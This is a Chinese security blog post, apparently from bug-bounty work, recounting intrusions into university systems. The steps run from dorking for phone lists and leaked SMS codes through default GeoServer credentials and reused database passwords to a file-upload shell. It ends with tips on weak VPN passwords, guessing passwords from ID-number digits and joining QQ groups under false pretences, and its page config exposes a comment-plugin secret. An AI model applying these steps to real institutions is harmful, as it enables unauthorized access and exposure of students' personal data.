+<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000000tpqtJ0FWQ9c.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000000tpqtJ0FWQ9c.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000000tpqtJ0FWQ9c.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://qqq.gtimg.cn/music/photo_new/T053XD000000tpqtJ0FWQ9c.jpg"
+            srcset="https://qqq.gtimg.cn/music/photo_new/T053XD000000tpqtJ0FWQ9c.jpg, https://qqq.gtimg.cn/music/photo_new/T053XD000000tpqtJ0FWQ9c.jpg 1.5x, https://qqq.gtimg.cn/music/photo_new/T053XD000000tpqtJ0FWQ9c.jpg 2x"
+            sizes="auto"
+            alt="https://qqq.gtimg.cn/music/photo_new/T053XD000000tpqtJ0FWQ9c.jpg">
+    </a></p>
+<p>2、直接使用工具进行扫描，进而获取权限进行内网渗透</p>
+<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000001YYdkU0uX2We.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000001YYdkU0uX2We.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000001YYdkU0uX2We.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://qqq.gtimg.cn/music/photo_new/T053XD000001YYdkU0uX2We.jpg"
+            srcset="https://qqq.gtimg.cn/music/photo_new/T053XD000001YYdkU0uX2We.jpg, https://qqq.gtimg.cn/music/photo_new/T053XD000001YYdkU0uX2We.jpg 1.5x, https://qqq.gtimg.cn/music/photo_new/T053XD000001YYdkU0uX2We.jpg 2x"
+            sizes="auto"
+            alt="https://qqq.gtimg.cn/music/photo_new/T053XD000001YYdkU0uX2We.jpg">
+    </a></p>
+<h2 id="9逻辑漏洞" class="headerLink">
+    <a href="#9%e9%80%bb%e8%be%91%e6%bc%8f%e6%b4%9e" class="header-mark"></a>9、逻辑漏洞</h2><h2 id="找回密码-1" class="headerLink">
+    <a href="#%e6%89%be%e5%9b%9e%e5%af%86%e7%a0%81-1" class="header-mark"></a>找回密码</h2><p>1、某站点找回密码处，短信验证码直接出现在回包中</p>
+<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000000WyfLD1DER16.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000000WyfLD1DER16.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000000WyfLD1DER16.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://qqq.gtimg.cn/music/photo_new/T053XD000000WyfLD1DER16.jpg"
+            srcset="https://qqq.gtimg.cn/music/photo_new/T053XD000000WyfLD1DER16.jpg, https://qqq.gtimg.cn/music/photo_new/T053XD000000WyfLD1DER16.jpg 1.5x, https://qqq.gtimg.cn/music/photo_new/T053XD000000WyfLD1DER16.jpg 2x"
+            sizes="auto"
+            alt="https://qqq.gtimg.cn/music/photo_new/T053XD000000WyfLD1DER16.jpg">
+    </a></p>
+<p>2、谷歌语法搜索 &ldquo;XX大学&rdquo; &ldquo;手机号&rdquo; filetype:xls 找到一些手机号码</p>
+<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000001pxoMG1KBa5L.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000001pxoMG1KBa5L.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000001pxoMG1KBa5L.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://qqq.gtimg.cn/music/photo_new/T053XD000001pxoMG1KBa5L.jpg"
+            srcset="https://qqq.gtimg.cn/music/photo_new/T053XD000001pxoMG1KBa5L.jpg, https://qqq.gtimg.cn/music/photo_new/T053XD000001pxoMG1KBa5L.jpg 1.5x, https://qqq.gtimg.cn/music/photo_new/T053XD000001pxoMG1KBa5L.jpg 2x"
+            sizes="auto"
+            alt="https://qqq.gtimg.cn/music/photo_new/T053XD000001pxoMG1KBa5L.jpg">
+    </a></p>
+<p>3、找回功能-修改密码-登录系统，发现是一个学校党务的测试系统</p>
+<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000001MUkcL0pQva0.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000001MUkcL0pQva0.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000001MUkcL0pQva0.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://qqq.gtimg.cn/music/photo_new/T053XD000001MUkcL0pQva0.jpg"
+            srcset="https://qqq.gtimg.cn/music/photo_new/T053XD000001MUkcL0pQva0.jpg, https://qqq.gtimg.cn/music/photo_new/T053XD000001MUkcL0pQva0.jpg 1.5x, https://qqq.gtimg.cn/music/photo_new/T053XD000001MUkcL0pQva0.jpg 2x"
+            sizes="auto"
+            alt="https://qqq.gtimg.cn/music/photo_new/T053XD000001MUkcL0pQva0.jpg">
+    </a></p>
+<p>但其中数据是真实的，有上千份姓名、手机号、学号、身份证等信息</p>
+<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD0000000bLew2HiRZ5.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD0000000bLew2HiRZ5.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD0000000bLew2HiRZ5.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://qqq.gtimg.cn/music/photo_new/T053XD0000000bLew2HiRZ5.jpg"
+            srcset="https://qqq.gtimg.cn/music/photo_new/T053XD0000000bLew2HiRZ5.jpg, https://qqq.gtimg.cn/music/photo_new/T053XD0000000bLew2HiRZ5.jpg 1.5x, https://qqq.gtimg.cn/music/photo_new/T053XD0000000bLew2HiRZ5.jpg 2x"
+            sizes="auto"
+            alt="https://qqq.gtimg.cn/music/photo_new/T053XD0000000bLew2HiRZ5.jpg">
+    </a></p>
+<h2 id="统一门户-1" class="headerLink">
+    <a href="#%e7%bb%9f%e4%b8%80%e9%97%a8%e6%88%b7-1" class="header-mark"></a>统一门户</h2><p>使用学号加身份证后六位直接登录统一服务平台</p>
+<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000001RUpTv1m0eXv.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000001RUpTv1m0eXv.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000001RUpTv1m0eXv.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://qqq.gtimg.cn/music/photo_new/T053XD000001RUpTv1m0eXv.jpg"
+            srcset="https://qqq.gtimg.cn/music/photo_new/T053XD000001RUpTv1m0eXv.jpg, https://qqq.gtimg.cn/music/photo_new/T053XD000001RUpTv1m0eXv.jpg 1.5x, https://qqq.gtimg.cn/music/photo_new/T053XD000001RUpTv1m0eXv.jpg 2x"
+            sizes="auto"
+            alt="https://qqq.gtimg.cn/music/photo_new/T053XD000001RUpTv1m0eXv.jpg">
+    </a></p>
+<h2 id="10geoserver弱口令" class="headerLink">
+    <a href="#10geoserver%e5%bc%b1%e5%8f%a3%e4%bb%a4" class="header-mark"></a>10、geoserver弱口令</h2><p>8085端口geoserver，进入登陆页面，使用默认账号密码admin/geoserver成功登录后台。</p>
+<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000001WIrVT0bpWWm.jpg" title="image.png" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000001WIrVT0bpWWm.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://qqq.gtimg.cn/music/photo_new/T053XD000001WIrVT0bpWWm.jpg"
+            srcset="https://qqq.gtimg.cn/music/photo_new/T053XD000001WIrVT0bpWWm.jpg, https://qqq.gtimg.cn/music/photo_new/T053XD000001WIrVT0bpWWm.jpg 1.5x, https://qqq.gtimg.cn/music/photo_new/T053XD000001WIrVT0bpWWm.jpg 2x"
+            sizes="auto"
+            alt="https://qqq.gtimg.cn/music/photo_new/T053XD000001WIrVT0bpWWm.jpg">
+    </a></p>
+<h2 id="获取数据库密码" class="headerLink">
+    <a href="#%e8%8e%b7%e5%8f%96%e6%95%b0%e6%8d%ae%e5%ba%93%e5%af%86%e7%a0%81" class="header-mark"></a>获取数据库密码</h2><p>登录后进入配置页面，点击查看其中的数据存储</p>
+<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000003cPJvY1rXGwr.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000003cPJvY1rXGwr.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000003cPJvY1rXGwr.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://qqq.gtimg.cn/music/photo_new/T053XD000003cPJvY1rXGwr.jpg"
+            srcset="https://qqq.gtimg.cn/music/photo_new/T053XD000003cPJvY1rXGwr.jpg, https://qqq.gtimg.cn/music/photo_new/T053XD000003cPJvY1rXGwr.jpg 1.5x, https://qqq.gtimg.cn/music/photo_new/T053XD000003cPJvY1rXGwr.jpg 2x"
+            sizes="auto"
+            alt="https://qqq.gtimg.cn/music/photo_new/T053XD000003cPJvY1rXGwr.jpg">
+    </a></p>
+<p>F12查看网页源代码，读取PostgreSQL密码：</p>
+<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000000sIMh90iw8d8.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000000sIMh90iw8d8.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000000sIMh90iw8d8.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://qqq.gtimg.cn/music/photo_new/T053XD000000sIMh90iw8d8.jpg"
+            srcset="https://qqq.gtimg.cn/music/photo_new/T053XD000000sIMh90iw8d8.jpg, https://qqq.gtimg.cn/music/photo_new/T053XD000000sIMh90iw8d8.jpg 1.5x, https://qqq.gtimg.cn/music/photo_new/T053XD000000sIMh90iw8d8.jpg 2x"
+            sizes="auto"
+            alt="https://qqq.gtimg.cn/music/photo_new/T053XD000000sIMh90iw8d8.jpg">
+    </a></p>
+<h2 id="撞库" class="headerLink">
+    <a href="#%e6%92%9e%e5%ba%93" class="header-mark"></a>撞库</h2><p>同时发现目标ip还对外开启了mysql数据库，使用root和上文获取到的密码，成功连接上。</p>
+<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000000Bom0G2vDAB4.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000000Bom0G2vDAB4.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000000Bom0G2vDAB4.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://qqq.gtimg.cn/music/photo_new/T053XD000000Bom0G2vDAB4.jpg"
+            srcset="https://qqq.gtimg.cn/music/photo_new/T053XD000000Bom0G2vDAB4.jpg, https://qqq.gtimg.cn/music/photo_new/T053XD000000Bom0G2vDAB4.jpg 1.5x, https://qqq.gtimg.cn/music/photo_new/T053XD000000Bom0G2vDAB4.jpg 2x"
+            sizes="auto"
+            alt="https://qqq.gtimg.cn/music/photo_new/T053XD000000Bom0G2vDAB4.jpg">
+    </a></p>
+<p>在其中一个log表中发现了账号和MD5加密的密码。</p>
+<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD0000018QDLG40WUnf.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD0000018QDLG40WUnf.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD0000018QDLG40WUnf.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://qqq.gtimg.cn/music/photo_new/T053XD0000018QDLG40WUnf.jpg"
+            srcset="https://qqq.gtimg.cn/music/photo_new/T053XD0000018QDLG40WUnf.jpg, https://qqq.gtimg.cn/music/photo_new/T053XD0000018QDLG40WUnf.jpg 1.5x, https://qqq.gtimg.cn/music/photo_new/T053XD0000018QDLG40WUnf.jpg 2x"
+            sizes="auto"
+            alt="https://qqq.gtimg.cn/music/photo_new/T053XD0000018QDLG40WUnf.jpg">
+    </a></p>
+<h2 id="getshell" class="headerLink">
+    <a href="#getshell" class="header-mark"></a>GetShell</h2><p>8888端口后台登录页，使用数据库中获取到的账号密码成功登录后台，发现是个金碟的系统，然后使用了文件上传漏洞，成功getshell（截图和payload有点敏感，就不放了）</p>
+<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000000v8iYs4LaRYZ.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000000v8iYs4LaRYZ.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000000v8iYs4LaRYZ.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://qqq.gtimg.cn/music/photo_new/T053XD000000v8iYs4LaRYZ.jpg"
+            srcset="https://qqq.gtimg.cn/music/photo_new/T053XD000000v8iYs4LaRYZ.jpg, https://qqq.gtimg.cn/music/photo_new/T053XD000000v8iYs4LaRYZ.jpg 1.5x, https://qqq.gtimg.cn/music/photo_new/T053XD000000v8iYs4LaRYZ.jpg 2x"
+            sizes="auto"
+            alt="https://qqq.gtimg.cn/music/photo_new/T053XD000000v8iYs4LaRYZ.jpg">
+    </a></p>
+<h2 id="总结" class="headerLink">
+    <a href="#%e6%80%bb%e7%bb%93" class="header-mark"></a>总结：</h2><p>对于高校的渗透可以从以下几点入手</p>
+<p>1、VPN弱口令，GitHub泄漏是重灾区，可以搜索&quot;学校域名&quot; &ldquo;password&rdquo;</p>
+<p>2、高校的站点一般比较老旧，aspx的站点比较多，可以多关注一下SQL注入，大多数的后台都存在SQL注入。</p>
+<p>3、多扫下目录，有些存在各种编辑器的漏洞，但是一些漏洞可能是伪修复了，比如说ueditor的文件上传，可能只是把参数名更换了，只要找到正确的参数名就可以继续利用。</p>
+<p>4、百度谷歌高级搜索学号文件，多收集一些账号，搜集网站的使用说明文件，其中有对密码组成进行说明，如身份证后六位等，针对一些管理员的账号进行密码的编排</p>
+<p>5、QQ官方群有一些敏感文件，可以使用上面搜集到的信息混入其中</p>
+<p>总结起来就是多信息收集，信息收集yyds</p></div>
+
+        <div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2024-07-28</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span><a class="link-to-mardown" href=/%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E6%B8%97%E9%80%8F%E6%89%93%E7%82%B9/index.md target="_blank" rel="noopener noreferrer">阅读原始文档</a>
+                    </span></div>
+            <div class="post-info-share">
+                <span></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">信息收集</a>,&nbsp;<a href="/tags/src/">SRC</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%8A%93%E5%8C%85%E5%8F%8A%E6%B5%8B%E8%AF%95/" class="prev" rel="prev" title="微信小程序抓包及测试"><i class="fas fa-angle-left fa-fw"></i>微信小程序抓包及测试</a>
+            <a href="/%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%85%B8%E6%95%99%E8%82%B2%E7%B3%BB%E7%BB%9F%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E6%89%93%E5%8C%85/" class="next" rel="next" title="一次经典教育系统后台漏洞打包">一次经典教育系统后台漏洞打包<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"><div id="gitalk" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://github.com/gitalk/gitalk"></a>Gitalk</a>.
+            </noscript></div></article></div>
+        </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2015 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://www.bysec.cn/" target="_blank" rel="noopener noreferrer">bysec</a></span><span class="icp-splitter">&nbsp;|&nbsp;</span><br class="icp-br"/>
+                    <span class="icp"><a href="http://beian.miit.gov.cn/" target="_blank">粤ICP备2024294125号</a></span></div>
+            <div class="footer-line"></div>
+            <div class="footer-line">
+            </div>
+        </div></footer></div>
+
+    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="回到顶部">
+            <i class="fas fa-arrow-up fa-fw"></i>
+        </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+            <i class="fas fa-comment fa-fw"></i>
+        </a>
+    </div><div id="cookieconsent-container"></div><div class="assets"><link rel="stylesheet" href="/lib/gitalk/gitalk.min.css"><link rel="stylesheet" href="/lib/lightgallery/lightgallery.min.css"><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/katex/copy-tex.min.css">
+        <noscript><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"></noscript><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":10},"comment":{"gitalk":{"admin":["CNbysec"],"clientID":"Ov23li64ijr3L89wsfoj","clientSecret":"a291b75ee7aaf91f94e71d89a39cf8098ee8ed80","id":"2024-07-28T18:23:14+08:00","owner":"CNbysec","repo":"CNbysec.github.io","title":"教育行业渗透打点"}},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"distance":null,"findAllMatches":null,"fuseIndexURL":"/index.json","highlightTag":"em","ignoreFieldNorm":null,"ignoreLocation":null,"isCaseSensitive":null,"location":null,"maxResultLength":10,"minMatchCharLength":null,"noResultsFound":"没有找到结果","snippetLength":50,"threshold":null,"type":"fuse","useExtendedSearch":null},"twemoji":true};</script><script type="text/javascript" src="/lib/gitalk/gitalk.min.js"></script><script type="text/javascript" src="/js/gitalk.min.js" defer></script><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/fuse/fuse.min.js"></script><script type="text/javascript" src="/lib/twemoji/twemoji.min.js" defer></script><script type="text/javascript" src="/js/twemoji.min.js" defer></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js" defer></script><script type="text/javascript" src="/lib/katex/auto-render.min.js" defer></script><script type="text/javascript" src="/lib/katex/copy-tex.min.js" defer></script><script type="text/javascript" src="/lib/katex/mhchem.min.js" defer></script><script type="text/javascript" src="/js/katex.min.js" defer></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script type="text/javascript" src="/js/cookieconsent.min.js" defer></script><script type="text/javascript" src="/js/theme.min.js" defer></script></div>
+</body>
+
+</html>
